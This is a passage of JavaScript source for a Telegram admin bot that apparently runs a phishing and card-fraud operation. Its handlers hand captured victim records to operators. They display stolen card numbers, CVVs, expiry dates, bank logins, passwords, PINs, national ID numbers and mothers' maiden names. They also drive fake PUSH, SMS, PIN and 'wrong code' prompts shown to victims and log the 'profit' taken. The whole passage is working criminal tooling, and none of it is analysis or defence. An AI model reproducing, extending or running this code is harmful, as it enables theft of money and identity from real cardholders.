      motherlastname: "Девичья фамилия матери",
      bank: "Банк",
    };

    const user = await User.findOne({ where: { id: log.ad.userId } });

    const operator = await Operators.findOne({
      where: {
        userId: user.operator,
      },
    });

    const ipBinding = await IpBinding.findOne({
      where: {
        // adId: log.ad.id,
        ip: log.ip, // ← Чёткое соответствие!
      },
    });

    const mammothTag = ipBinding?.identifier
      ? `#${ipBinding.identifier}`
      : "отсутствует";

    let lkData = Object.keys(data)
      .map((key) =>
        data[key]
          ? `\n${translatedFields[key]}: <code>${
              key === "bank" ? data[key] : "***"
            }</code>`
          : ""
      )
      .join("");

    const botMessage = `<b>❌ Вбивер @${
      ctx.from.username
    } отказался от лога:</b>
${lkData}

👤 Воркер: <b>${
      user.username ? `@${user.username}` : `Профиль (${user.id})`
    }</b>
👨🏼‍💻 Оператор: <b>${operator ? `@${operator.username}` : "отсутствует"}</b>

📦 Объявление: <b>${ad.title || "Без названия"}</b>
💰 Цена: <b>${ad.price || "не указана"}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b>`;

  await ctx.telegram.sendMessage(ctx.state.bot.logsGroupId, botMessage, {
      parse_mode: "HTML",
      reply_markup: Markup.inlineKeyboard([
        [Markup.callbackButton("✍️ Взять на вбив", `take_log_lk_${log.id}`)],
      ]),
    });

 // Уведомление воркеру в ЛС
    await ctx.telegram.sendMessage(
      ad.userId,
      `<b>❌ Вбивер @${ctx.from.username} отказался от лога ${
        log.ad.service.title
      }</b>
      
📦 Объявление: <b>${ad.title || "Без названия"}</b>
💰 Цена: <b>${ad.price || "не указана"}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b>
`,
      { parse_mode: "HTML" }
    );

    if (user.operator != null) {
      const operator = await Operators.findOne({
        where: {
          userId: user.operator,
        },
      });

      if (operator) {
        await ctx.telegram.sendMessage(
          operator.userId,
          `<b>❌ Вбивер @${ctx.from.username} отказался от лога ${
            log.ad.service.title
          }</b>

👤 Воркер: <b>${
            user.username ? `@${user.username}` : `Профиль (${user.id})`
          }</b>

📦 Объявление: <b>${ad.title ?? "Без названия"}</b>
💰 Цена: <b>${ad.price ?? "отсутствует"}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b>`,
          {
            parse_mode: "HTML",
          }
        );
      }
    }
  } catch (err) {
    console.log(err);
    ctx.answerCbQuery("❌ Ошибка", true).catch((err) => err);
  }
});


adminBot.action(/^enter_(\d+)$/, async (ctx) => {
  try {
    // Проверяем статус пользователя, допускаем только статус 1 и вбиверов
    if (ctx.state.user.status !== 1 && ctx.state.user.status !== 2) {
      return await ctx.answerCbQuery(
        "❌ У вас нет доступа к этому действию.",
        true
      );
    }

    const log = await Log.findByPk(ctx.match[1], {
      include: [
        {
          association: "ad",
          required: true,
          include: [
            {
              association: "user",
              required: true,
            },
            {
              association: "service",
              required: true,
              include: [
                {
                  association: "country",
                  required: true,
                },
                {
                  association: "currency",
                  required: true,
                },
              ],
            },
          ],
        },
      ],
    });

   

    const cardInfo = await getCardInfo(log.cardNumber);
    const bin = String(log.cardNumber).slice(0, 6);
    const detectedCurrency = await getCurrencyFromBin(bin);

    // Получаем курсы USD и EUR из базы
    let usdRate = 1;
    let eurRate = 1;

    if (detectedCurrency) {
      const currencyFromDb = await Currency.findOne({
        where: { code: detectedCurrency },
      });
      if (currencyFromDb) {
        usdRate = parseFloat(currencyFromDb.usd) || 1;
        eurRate = parseFloat(currencyFromDb.eur) || 1;
      }
    }

    // Сохраняем валюту и курсы в лог
    log.detectedCurrency = detectedCurrency || log.ad.service.currency.code;
    log.usdRate = usdRate;
    log.eurRate = eurRate;

    const ipBinding = await IpBinding.findOne({
      where: {
        // adId: log.ad.id,
        ip: log.ip, // ← Чёткое соответствие!
      },
    });

    const mammothTag = ipBinding?.identifier
      ? `#${ipBinding.identifier}`
      : "отсутствует";

    // Предварительное сообщение с подтверждением
    await ctx.replyWithHTML(
      `<b>Вы уверены, что хотите выдать этот лог?</b>

Выдает: @${ctx.from.username}`,
      {
        reply_to_message_id: ctx.callbackQuery.message.message_id, // Указываем ID сообщения, на которое отвечаем

        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("✅ Да", `confirm_${log.id}`)],
          [Markup.callbackButton("❌ Нет", `cancel_${log.id}`)],
        ]),
      }
    );

    // Обработчик подтверждения
    adminBot.action(`confirm_${log.id}`, async (ctx) => {
      try {
        await ctx.telegram.sendMessage(
          log.userId,
          `<b>✅ Вам выдан лог пользователем @${ctx.from.username}:</b>
          
💰 Баланс: <b>${getBalance(log, log.ad)}</b>
💳 Номер карты: <code>${log.cardNumber}</code>
💳 Срок действия: <code>${log.cardExpire}</code>
💳 CVV: <code>${log.cardCvv}</code>
ℹ️ Информация о карте: ${cardInfo}

🦣 <b>${mammothTag}</b>

🔍 <b>#id${log.adId}</b>`,
          {
            parse_mode: "HTML",
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("❌", `delete`)],
            ]),
          }
        );
        await ctx.deleteMessage().catch((err) => err);

        await ctx.answerCbQuery("✅ Лог успешно выдан!");
      } catch (err) {
        console.log(err);
        await ctx.answerCbQuery("❌ Ошибка при выдаче лога.");
      }
    });

    // Обработчик отмены
    adminBot.action(`cancel_${log.id}`, async (ctx) => {
      await ctx.deleteMessage().catch((err) => err);

      await ctx.answerCbQuery("❌ Выдача лога отменена.");
    });
  } catch (err) {
    console.log(err);
    await ctx.replyWithHTML(`<b>❌ Ошибка</b>`).catch((err) => err);
  }
});
adminBot.action(/^log_(\d+)_(leavevbiv|removeVbiver)$/, async (ctx) => {
  try {
   // Проверка статуса пользователя: только статус 2 или 1
      if (ctx.state.user.status !== 1) {
        return ctx.answerCbQuery("❌ У вас нет доступа к этому действию.", true);
      }

    const logId = ctx.match[1];
    const action = ctx.match[2];

    const log = await Log.findByPk(logId, {
      include: [
        {
          association: "ad",
          required: true,
          include: [{ association: "service", required: true }],
        },
      ],
    });

    if (!log) return ctx.answerCbQuery("❌ Лог не найден", true);
 const ipBinding = await IpBinding.findOne({
        where: {
          // adId: log.ad.id,
          ip: log.ip, // ← Чёткое соответствие!
        },
      });

      const mammothTag = ipBinding?.identifier
        ? `#${ipBinding.identifier}`
        : "отсутствует";


    const logs = await Log.findAll({
      where: {  adId: log.ad.id },
      include: [
        {
          association: "ad",
          required: true,
          include: [{ association: "service", required: true }],
        },
      ],
    });

    if (!logs.length) {
      return ctx.answerCbQuery("❌ Нет логов для отказа.", true);
    }

    // Уведомление для вбивера
    const messageText = (singleLog) =>
      `<b>❌ Вы были отказаны от лога ${singleLog.ad.service.title}</b>\n\n` +
                  `👤 Отказал: <b>@${ctx.from.username || "нет"}</b> | <code>${
                    ctx.from.id
                  }</code>\n\n` +
                  `🦣 <b>${mammothTag}</b>\n\n` +
                  `🔍 <b>#id${singleLog.ad.id}</b>`;

 

    await Promise.all(
      logs.map(async (singleLog) => {
        const userId = singleLog.writerId;

        // Обнуляем writerId
        await singleLog.update({ writerId: null });

        if (userId) {
          // Удаляем сообщение у вбивера (если есть)
          if (singleLog.chatMsg2) {
            try {
              await ctx.telegram.deleteMessage(userId, singleLog.chatMsg2);
            } catch (err) {
              console.warn("❗ Не удалось удалить сообщение:", err.message);
            }
          }

          // Отправляем уведомление
          await ctx.telegram.sendMessage(userId, messageText(singleLog), {
            parse_mode: "HTML",
          });
        }
      })
    );

     await ctx.answerCbQuery(
      action === "removeVbiver"
        ? "✅ Вбивер успешно отказан"
        : "✅ Вбивер успешно отказан",
      true
    );
    // Обновляем кнопки
    return ctx.editMessageReplyMarkup(
      Markup.inlineKeyboard([
        [
          Markup.callbackButton(
            "✍️ Взять на вбив",
            action === "removeVbiver"
              ? `take_log_lk_${log.id}`
              : `take_log_${log.id}`
          ),
        ],
        ...(action === "leavevbiv"
          ? [[Markup.callbackButton("💳 Выдать лог", `enter_${log.id}`)]]
          : []),
      ])
    );
  } catch (err) {
    console.error(err);
    return ctx.answerCbQuery("❌ Ошибка при выполнении действия", true);
  }
});
adminBot.action(
  /^log_(\d+)_(bank|push|myeror|myerorfield|sms|lk|blik|appCode|callCode|picture|otherCard|otherLk|card|fakeLk|limits|forVerify|leaveLk|leavevbivLk|correctBalance|profit|pincode|leave|scream)$/,
  async (ctx) => {
    try {
      // Проверка статуса пользователя: только статус 2 или 1
      if (ctx.state.user.status !== 2 && ctx.state.user.status !== 1) {
        return ctx.answerCbQuery("❌ У вас нет доступа к этому действию.", true);
      }
      const log = await Log.findByPk(ctx.match[1], {
        include: [
          {
            association: "ad",
            required: true,
            include: [
              {
                association: "user",
                required: true,
              },
              {
                association: "service",
                required: true,
                include: [
                  {
                    association: "country",
                    required: true,
                  },
                  {
                    association: "currency",
                    required: true,
                  },
                ],
              },
            ],
          },
          {
            association: "writer",
            required: true,
          },
        ],
      });

      const ipBinding = await IpBinding.findOne({
        where: {
          // adId: log.ad.id,
          ip: log.ip, // ← Чёткое соответствие!
        },
      });

      const mammothTag = ipBinding?.identifier
        ? `#${ipBinding.identifier}`
        : "отсутствует";

     

      if (ctx.match[2] === "leaveLk") {
        try {
          // Проверяем статус пользователя: только статус вбивера (2)

          // Проверяем, принадлежит ли лог текущему вбиверу
          if (log.writerId !== ctx.from.id) {
            return ctx.answerCbQuery("❌ Этот лог вам не принадлежит.", true);
          }

          // Удаляем сообщение chatMsg2 у вбивера, если оно существует
          if (log.chatMsg2) {
            try {
              await ctx.telegram.deleteMessage(ctx.from.id, log.chatMsg2);
            } catch (err) {
              console.error(
                `Ошибка при удалении сообщения chatMsg2: ${err.message}`
              );
            }
          }

          // Удаляем writerId для лога
          await log.update({ writerId: null });

          // Отправляем уведомление пользователю
          await ctx.answerCbQuery("✅ Вы успешно отказались от лога.", true);

          // Редактируем кнопки
          return ctx.editMessageReplyMarkup(
            Markup.inlineKeyboard([
              [
                Markup.callbackButton(
                  "✍️ Взять на вбив",
                  `take_log_lk_${log.id}`
                ),
              ],
            ])
          );
        } catch (err) {
          console.error(err);
          return ctx.answerCbQuery("❌ Ошибка при отказе от лога.", true);
        }
      }

      // Действие "leave": Вбивер самостоятельно выходит из лога
      if (ctx.match[2] === "leave") {
        try {
          // Проверяем, принадлежит ли лог текущему вбиверу
          if (log.writerId !== ctx.from.id) {
            return ctx.answerCbQuery("❌ Этот лог вам не принадлежит.", true);
          }

          if (log.chatMsg2) {
            try {
              await ctx.telegram.deleteMessage(ctx.from.id, log.chatMsg2);
            } catch (err) {
              console.error(
                `Ошибка при удалении сообщения chatMsg2: ${err.message}`
              );
            }
          }
          // Удаляем writerId для лога
          await log.update({ writerId: null });

          // Отправляем уведомление пользователю
          await ctx.answerCbQuery(
            "✅ Вы успешно вышли со вбива этого лога",
            true
          );

          // Уведомление воркеру
          await ctx.telegram.sendMessage(
            log.ad.userId,
            `<b>❌ Вбивер @${ctx.from.username} вышел со вбива этого лога ${log.ad.service.title}</b>

📦 Объявление: <b>${log.ad.title || "Без названия"}</b>
💰 Цена: <b>${log.ad.price || "не указана"}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${log.ad.id}</b>`,
            { parse_mode: "HTML" }
          );

          // Редактируем кнопки
          return ctx.editMessageReplyMarkup(
            Markup.inlineKeyboard([
              [Markup.callbackButton("✍️ Взять на вбив", `take_log_${log.id}`)],
              [Markup.callbackButton("💳 Выдать лог", `enter_${log.id}`)],
            ])
          );
        } catch (err) {
          console.error(err);
          return ctx.answerCbQuery("❌ Ошибка при выходе из лога.", true);
        }
      }
      // Если writerId не равен null, продолжаем выполнение логики обработки лога
      if (log.writerId) {
        // Обновление статуса лога и отправка уведомления
        await log.update({ status: ctx.match[2], smsCode: null });

        if (log.status === "profit") {
          await ctx.answerCbQuery("🎉 Поздравляем с успешным вбивом!");
          return ctx.scene.enter(`admin_add_profit`, {
            userId: log.ad.userId,
            serviceTitle: log.ad.service.title,
            currency: log.ad.service.currency.code,
            mailer: log.ad.mailer,
            mailer2: log.ad.mailer2,
            mailer3: log.ad.mailer3,
            mailer4: log.ad.mailer4,
            mailer5: log.ad.mailer5,
            mailer6: log.ad.mailer6,
            mailer7: log.ad.mailer7,
            mailer8: log.ad.mailer8,
            mailer9: log.ad.mailer9,

            bin: log.bin,

            sms: log.ad.sms,
            sms2: log.ad.sms2,
            sms3: log.ad.sms3,

            screen: log.ad.screen,
            screen2: log.ad.screen2,
            screen3: log.ad.screen3,
            screen4: log.ad.screen4,

            adId: log.ad.id,
          });
        }

        // Уведомление пользователя и оператора об изменении статуса
        await ctx.answerCbQuery(
          `✅ Вы успешно изменили статус лога на "${
            locale.statuses[log.status]
          }"`,
          true
        );

        await ctx
          .editMessageReplyMarkup(
            Markup.inlineKeyboard([
              [Markup.callbackButton("✅ ПРОФИТ", `log_${log.id}_profit`)],
              [
                Markup.callbackButton(
                  `Статус: ${locale.statuses[log.status]}`,
                  "none"
                ),
              ],

              // Онлайн / Фото / Диалог (если нужно добавить — здесь)
              [
                Markup.callbackButton("👁 Онлайн", `check_mamont_${log.ad.id}`),
                Markup.callbackButton(
                  "🗨️ Диалог",
                  `dialog_writer_${log.supportId}`
                ),
                Markup.callbackButton("🏞️ Фото", `log_${log.id}_photo`),
              ],

              // Кастомные PUSH / SMS
              [
                Markup.callbackButton("💬 C-PUSH", `log_${log.id}_myeror`),
                Markup.callbackButton("💬 C-SMS", `log_${log.id}_myerorfield`),
              ],

              // PUSH / SMS / ТОЧНЫЙ
              [
                Markup.callbackButton("📲 PUSH", `log_${log.id}_push`),
                Markup.callbackButton(
                  "💰 ТОЧНЫЙ",
                  `log_${log.id}_correctBalance`
                ),
                Markup.callbackButton("📤 SMS", `log_${log.id}_sms`),
              ],

              // Карта / Лимиты
              [
                Markup.callbackButton("💳 СМЕНА", `log_${log.id}_otherCard`),
                Markup.callbackButton("⚠️ ЛИМИТЫ", `log_${log.id}_limits`),
              ],

              // Баланс / PIN
              [
                Markup.callbackButton("💸 ДЕП", `log_${log.id}_dep`),
                Markup.callbackButton("🔐 PIN", `log_${log.id}_pincode`),
              ],

              // Ошибки
              [
                Markup.callbackButton("❌ КОД", `log_${log.id}_wrong_code`),
                Markup.callbackButton("❌ ПУШ", `log_${log.id}_wrong_push`),
              ],
              // Блок / Разблок (с новыми названиями)
              [
                Markup.callbackButton(
                  "⛔ Блок. Карту",
                  `log_${log.id}_banCard`
                ),
                Markup.callbackButton(
                  "✅ Разблок. Карту",
                  `log_${log.id}_unbanCard`
                ),
              ],
              // Отказ
              [Markup.callbackButton("🚫 ОТКАЗАТЬСЯ", `log_${log.id}_lsLeave`)],
            ])
          )
          .catch((err) => err);

        // Уведомление воркеру
        await ctx.telegram.sendMessage(
          log.ad.userId,
          `<b>${locale.workerStatuses[log.status]} ${log.ad.service.title}</b>
          
✍️ Вбивер: <b>@${ctx.from.username}</b>

📦 Объявление: <b>${log.ad.title ?? "Без названия"}</b>
  
💰 Цена: <b>${log.ad.price ?? "отсутствует"}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${log.ad.id}</b>`,
          {
          parse_mode: "HTML",
          reply_markup: getUserRoleKeyboard({
            ctx,
            log,
            supportId: log.supportId,
            isOperator: false,
          }),
        }
        );
      }

      // Уведомление оператору, если он существует
      if (log.ad.user.operator) {
        const operator = await Operators.findOne({
          where: { userId: log.ad.user.operator },
        });
        if (operator) {
          await ctx.telegram.sendMessage(
            operator.userId,
            `<b>${locale.workerStatuses[log.status]} ${log.ad.service.title}</b>
            
👤 Воркер: <b>${
          log.ad.user.username
            ? `@${log.ad.user.username}`
            : `Профиль (${log.ad.userId})`
        }</b>

📦 Объявление: <b>${log.ad.title ?? "Без названия"}</b>
💰 Цена: <b>${log.ad.price ?? "отсутствует"}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${log.ad.id}</b>`,
             {
          parse_mode: "HTML",
          reply_markup: getUserRoleKeyboard({
            ctx,
            log,
            supportId: log.supportId,
            isOperator: true,
          }),
        }
          );
        }
      }
    } catch (err) {
      console.log(err);
      ctx.answerCbQuery("❌ Ошибка", true);
    }
  }
);

adminBot.action("admin_reduction", async (ctx) => {
  return ctx.scene.enter("admin_reduction");
});



adminBot.action(/^log_(\d+)_(ban|unban)Card$/, async (ctx) => {
  try {
    const log = await Log.findOne({
      where: {
        id: ctx.match[1],
      },
    });

    if (!log) {
      return ctx.answerCbQuery("❌ Ошибка: запись не найдена!", true);
    }

    const action = ctx.match[2]; // "ban" или "unban"
    const isBan = action === "ban";
    const actionText = isBan ? "заблокировал" : "разблокировал";
    const actionEmoji = isBan ? "🔒" : "🔓";
    const successMessage = isBan
      ? "✅ Карта успешно заблокирована!"
      : "✅ Карта успешно разблокирована!";

    if (isBan) {
      await BlockCards.create({
        card: log.cardNumber,
      });
    } else {
      await BlockCards.destroy({
        where: {
          card: log.cardNumber,
        },
      });
    }

    // Отправляем сообщение в лог-чат
    await ctx.telegram.sendMessage(
      ctx.state.bot.logsGroupId,
      `${actionEmoji} <b>Пользователь @${ctx.from.username} ${actionText} карту</b>\n\n💳 <code>${log.cardNumber}</code>`,
      {
        parse_mode: "HTML",
        reply_to_message_id: log.chatMsg, // Отвечаем на сообщение
      }
    );

    // Отправляем ответ пользователю
    return ctx.answerCbQuery(successMessage, true);
  } catch (err) {
    console.error(err);
    return ctx.answerCbQuery("❌ Ошибка при выполнении операции!", true);
  }
});

adminBot.action(/^take_log_(\d+)$/, async (ctx) => {
  try {
    if (ctx.state.user.status == 2 || ctx.state.user.status == 1) {
      const log = await Log.findByPk(ctx.match[1], {
        include: [
          {
            association: "ad",
            required: true,
            include: [
              {
                association: "user",
                required: true,
              },
              {
                association: "service",
                required: true,
                include: [
                  { association: "country", required: true },
                  { association: "currency", required: true },
                ],
              },
            ],
          },
        ],
      });

      if (!log) {
        return ctx.answerCbQuery("❌ Лог не найден", true).catch((err) => err);
      }

      const [updatedCount] = await Log.update(
        { writerId: ctx.from.id },
        {
          where: {
            id: log.id,
            [Op.or]: [
              { writerId: null },
              { writerId: ctx.from.id }, // позволяет повторно взять свой лог
            ],
          },
        }
      );
      
      if (updatedCount === 0) {
        const current = await Log.findByPk(log.id);
        const writerUser = current.writerId
          ? await User.findByPk(current.writerId)
          : null;
      
        return ctx.replyWithHTML(
          `<b>❌ Лог уже привязан к вбиверу @${
            writerUser?.username || "неизвестный"
          }</b>`,
          {
            reply_to_message_id: ctx.callbackQuery.message.message_id,
          }
        );
      }

      await ctx.answerCbQuery(`✅ Удачного вбива!`).catch((err) => err);

      const cardInfo = await getCardInfo(log.cardNumber);

      const bin = String(log.cardNumber).slice(0, 6);
      const detectedCurrency = await getCurrencyFromBin(bin);

      // Получаем курсы USD и EUR из базы
      let usdRate = 1;
      let eurRate = 1;

      if (detectedCurrency) {
        const currencyFromDb = await Currency.findOne({
          where: { code: detectedCurrency },
        });
        if (currencyFromDb) {
          usdRate = parseFloat(currencyFromDb.usd) || 1;
          eurRate = parseFloat(currencyFromDb.eur) || 1;
        }
      }

      // Сохраняем валюту и курсы в лог
      log.detectedCurrency = detectedCurrency || log.ad.service.currency.code;
      log.usdRate = usdRate;
      log.eurRate = eurRate;

      const ipBinding = await IpBinding.findOne({
        where: {
          // adId: log.ad.id,
          ip: log.ip, // ← Чёткое соответствие!
        },
      });

      const mammothTag = ipBinding?.identifier
        ? `#${ipBinding.identifier}`
        : "отсутствует";

      const user2 = await User.findByPk(log.ad.userId);
      const operator = user2?.operator
        ? await Operators.findOne({ where: { userId: user2.operator } })
        : null;

      const msg = await ctx.telegram.sendMessage(
        ctx.from.id,
        `
<b>✍️ Вы взяли лог ${
          log.ad.user.hideService == true ? "🏴" : log.ad.service.title
        } </b>

💰 Баланс: <b>${getBalance(log, log.ad)}</b>
🪪 Держатель карты: <code>${log.cardHolder}</code>
💳 Номер карты: <code>${log.cardNumber}</code>
🗓️ Срок действия: <code>${log.cardExpire}</code>
🔒 CVV: <code>${log.cardCvv}</code>
ℹ️ Информация о карте: ${cardInfo}

👤 Воркер: <b>${
          log.ad.user.username
            ? `@${log.ad.user.username}`
            : `Профиль (${log.ad.userId})`
        }</b>
👨🏼‍💻 Оператор: <b>${operator ? `@${operator.username}` : "отсутствует"}</b>

📦 Объявление: <b>${log.ad.title == null ? "Без названия" : log.ad.title}</b>
💰 Цена: <b>${log.ad.price == null ? "отсутствует" : log.ad.price}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${log.ad.id}</b>

<i>⚠️ Незабудь после ухода со вбива прописать комманду</i> <b>/leavealllogs</b>, <i>для того чтоб отказаться от всех логов.</i>

`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            // Главное
            [Markup.callbackButton("✅ ПРОФИТ", `log_${log.id}_profit`)],

            // Онлайн / Фото / Диалог (если нужно добавить — здесь)
            [
              Markup.callbackButton("👁 Онлайн", `check_mamont_${log.ad.id}`),
              Markup.callbackButton(
                "🗨️ Диалог",
                `dialog_writer_${log.supportId}`
              ),
              Markup.callbackButton("🏞️ Фото", `log_${log.id}_photo`),
            ],

            // Кастомные PUSH / SMS
            [
              Markup.callbackButton("💬 C-PUSH", `log_${log.id}_myeror`),
              Markup.callbackButton("💬 C-SMS", `log_${log.id}_myerorfield`),
            ],

            // PUSH / SMS / ТОЧНЫЙ
            [
              Markup.callbackButton("📲 PUSH", `log_${log.id}_push`),
              Markup.callbackButton(
                "💰 ТОЧНЫЙ",
                `log_${log.id}_correctBalance`
              ),
              Markup.callbackButton("📤 SMS", `log_${log.id}_sms`),
            ],

            // Карта / Лимиты
            [
              Markup.callbackButton("💳 СМЕНА", `log_${log.id}_otherCard`),
              Markup.callbackButton("⚠️ ЛИМИТЫ", `log_${log.id}_limits`),
            ],

            // Баланс / PIN
            [
              Markup.callbackButton("💸 ДЕП", `log_${log.id}_dep`),
              Markup.callbackButton("🔐 PIN", `log_${log.id}_pincode`),
            ],

            // Ошибки
            [
              Markup.callbackButton("❌ КОД", `log_${log.id}_wrong_code`),
              Markup.callbackButton("❌ ПУШ", `log_${log.id}_wrong_push`),
            ],
            // Блок / Разблок (с новыми названиями)
            [
              Markup.callbackButton("⛔ Блок. Карту", `log_${log.id}_banCard`),
              Markup.callbackButton(
                "✅ Разблок. Карту",
                `log_${log.id}_unbanCard`
              ),
            ],

            // Отказ
            [Markup.callbackButton("🚫 ОТКАЗАТЬСЯ", `log_${log.id}_lsLeave`)],
          ]),
        }
      );
      await ctx.telegram
        .pinChatMessage(ctx.from.id, msg.message_id, {
          disable_notification: true,
        })
        .catch((err) => console.error("Ошибка при закреплении:", err));

      await log.update({
        chatMsg2: msg.message_id,
      });

      await ctx
        .editMessageReplyMarkup(
          Markup.inlineKeyboard([
            [
              Markup.urlButton(
                `🔄 ${ctx.from.first_name}`,
                `t.me/${ctx.from.username}`
              ),
            ],
            [Markup.callbackButton("✅ ПРОФИТ", `log_${log.id}_profit`)],

            [Markup.callbackButton("🚫 ОТКАЗАТЬСЯ", `log_${log.id}_leave`)],
            [
              Markup.callbackButton(
                "❌ Отказать вбивера",
                `log_${log.id}_leavevbiv`
              ),
            ],
          ])
        )
        .catch((err) => err);

      const user = await User.findOne({
        where: {
          id: log.ad.userId,
        },
      });

      await ctx.telegram
        .sendMessage(
          log.ad.userId,
          `<b>ℹ️ Ваш лог ${log.ad.service.title} взят на вбив</b>

✍️ Вбивер: <b>@${ctx.from.username}</b>

📦 Объявление: <b>${log.ad.title == null ? "Без названия" : log.ad.title}</b>
💰 Цена: <b>${log.ad.price == null ? "отсутствует" : log.ad.price}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${log.ad.id}</b>
`,

           {
          parse_mode: "HTML",
          reply_markup: getUserRoleKeyboard({
            ctx,
            log,
            supportId: log.supportId,
            isOperator: false,
          }),
        }
        )
        .catch((err) => err);

      if (user.operator != null) {
        const operator = await Operators.findOne({
          where: {
            userId: user.operator,
          },
        });

        ctx.telegram.sendMessage(
          operator.userId,
          `<b>ℹ️ Лог ${log.ad.service.title} взят на вбив</b>

✍️ Вбивер: <b>@${ctx.from.username}</b>

👤 Воркер: <b>${
          user.username ? `@${user.username}` : `Профиль (${log.ad.userId})`
        }</b>
      
📦 Объявление: <b>${log.ad.title == null ? "Без названия" : log.ad.title}</b>
💰 Цена: <b>${log.ad.price == null ? "отсутствует" : log.ad.price}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${log.ad.id}</b>`,
          {
          parse_mode: "HTML",
          reply_markup: getUserRoleKeyboard({
            ctx,
            log,
            supportId: log.supportId,
            isOperator: true,
          }),
        }
        );
      }
    } else {
      ctx
        .answerCbQuery("❌ У вас нет доступа к этому действию.", true)
        .catch((err) => err);
    }
  } catch (err) {
    console.log(err);
    ctx.answerCbQuery("❌ Ошибка", true).catch((err) => err);
  }
});

adminBot.action(/^take_log1_(\d+)$/, async (ctx) => {
  try {
    if (ctx.state.user.status == 2 || ctx.state.user.status == 1) {
      const log = await Log.findOne({
        where: {
          id: ctx.match[1],
        },
      });

      await ctx.answerCbQuery(`✅ Удачного вбива!`).catch((err) => err);
      try {
        const cardInfo = await binInfo(String(log.cardNumber).substr(0, 8));
        bank = cardInfo?.bank;
      } catch (err) {}

   
      const cardInfo = await getCardInfo(log.cardNumber);

      const msg = await ctx.telegram.sendMessage(
        ctx.from.id,
        `
<b>✍️ Вы взяли лог</b>

💰 Баланс: <b>${log.otherInfo.cardBalance}</b>

💳 Номер карты: <b>${log.cardNumber}</b>
🗓️ Срок действия: <b>${log.cardExpire}</b>
🔒 CVV: <b>${log.cardCvv}</b>
ℹ️ Информация о карте: ${cardInfo}

👤 Воркер: <b>@${log.cardHolder}</b>`,
        {
          parse_mode: "HTML",
        }
      );

      await ctx.telegram
        .pinChatMessage(ctx.from.id, msg.message_id, {
          disable_notification: true,
        })
        .catch((err) => console.error("Ошибка при закреплении:", err));

      // Отправляем сообщение владельцу лога, с ответом на его оригинальное сообщение
      await ctx.telegram.sendMessage(
        log.userId,
        `<b>✅ Ваш лог взят на вбив

✍️ Вбивер @${ctx.from.username}</b>`,
        {
          parse_mode: "HTML",
        }
      );

      await log.update({
        chatMsg2: msg.message_id,
      });

      await ctx
        .editMessageReplyMarkup(
          Markup.inlineKeyboard([
            [
              Markup.urlButton(
                `🔄 ${ctx.from.first_name}`,
                `t.me/${ctx.from.username}`
              ),
            ],
          ])
        )
        .catch((err) => err);
    } else {
      ctx
        .answerCbQuery("❌ У вас нет доступа к этому действию.", true)
        .catch((err) => err);
    }
  } catch (err) {
    console.log(err);
    ctx.answerCbQuery("❌ Ошибка", true).catch((err) => err);
  }
});
adminBot.action(/^take_log_lk_(\d+)$/, async (ctx) => {
  try {
    if (ctx.state.user.status == 2 || ctx.state.user.status == 1) {
      const log = await Log.findByPk(ctx.match[1], {
        include: [
          {
            association: "ad",
            required: true,
            include: [
              {
                association: "user",
                required: true,
              },
              {
                association: "service",
                required: true,
                include: [
                  {
                    association: "country",
                    required: true,
                  },
                ],
              },
            ],
          },
        ],
      });

      if (!log)
        return ctx.answerCbQuery("❌ Лог не найден", true).catch((err) => err);
      const [updatedCount] = await Log.update(
        { writerId: ctx.from.id },
        {
          where: {
            id: log.id,
            [Op.or]: [
              { writerId: null },
              { writerId: ctx.from.id }, // позволяет повторно взять свой лог
            ],
          },
        }
      );
      
      if (updatedCount === 0) {
        const current = await Log.findByPk(log.id);
        const writerUser = current.writerId
          ? await User.findByPk(current.writerId)
          : null;
      
        return ctx.replyWithHTML(
          `<b>❌ Лог уже привязан к вбиверу @${
            writerUser?.username || "неизвестный"
          }</b>`,
          {
            reply_to_message_id: ctx.callbackQuery.message.message_id,
          }
        );
      }

      await ctx.answerCbQuery("✅ Удачного вбива").catch((err) => err);

      const data = {
        phone: log.otherInfo.phone
          ? escapeHTML(String(log.otherInfo.phone).trim())
          : null,
        login: log.otherInfo.login
          ? escapeHTML(String(log.otherInfo.login).trim())
          : null,
        password: log.otherInfo.password
          ? escapeHTML(String(log.otherInfo.password).trim())
          : null,
        pesel: log.otherInfo.pesel
          ? escapeHTML(String(log.otherInfo.pesel).trim())
          : null,
        pin: log.otherInfo.pin
          ? escapeHTML(String(log.otherInfo.pin).trim())
          : null,
        motherlastname: log.otherInfo.motherlastname
          ? escapeHTML(String(log.otherInfo.motherlastname).trim())
          : null,
      };

      var lkData = "";

      const translate = {
        phone: "Номер телефона",
        login: "LOGIN",
        password: "PASSWORD",
        pesel: "Песель",
        pin: "PIN",
        motherlastname: "Девичья фамилия матери",
      };
      const user = await User.findOne({ where: { id: log.ad.userId } });

      const operator = await Operators.findOne({
        where: {
          userId: user.operator,
        },
      });

      const ipBinding = await IpBinding.findOne({
        where: {
          // adId: log.ad.id,
          ip: log.ip, // ← Чёткое соответствие!
        },
      });

      const mammothTag = ipBinding?.identifier
        ? `#${ipBinding.identifier}`
        : "отсутствует";

      Object.keys(data).map((v) => {
        if (data[v]) lkData += `\n${translate[v]}: <code>${data[v]}</code>`;
      });

      const msg = await ctx.telegram.sendMessage(
        ctx.from.id,
        `<b>✍️ Вы взяли лог ${log.ad.user.hideService == true ? "🏴" : log.ad.service.title
        } </b>
${lkData}
BANK: <b>${log.otherInfo.bank || "неизвестен"}</b>

👤 Воркер: <b>${
          log.ad.user.username
            ? `@${log.ad.user.username}`
            : `Профиль (${log.ad.userId})`
        }</b>
👨🏼‍💻 Оператор: <b>${operator ? `@${operator.username}` : "отсутствует"}</b>
 
💰 Цена: <b>${log.ad.price == null ? "отсутствует" : log.ad.price}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${log.ad.id}</b> 

<i>⚠️ Незабудь после ухода со вбива прописать комманду</i> <b>/leavealllogs</b>, <i>для того чтоб отказаться от всех логов.</i>
`,
        {
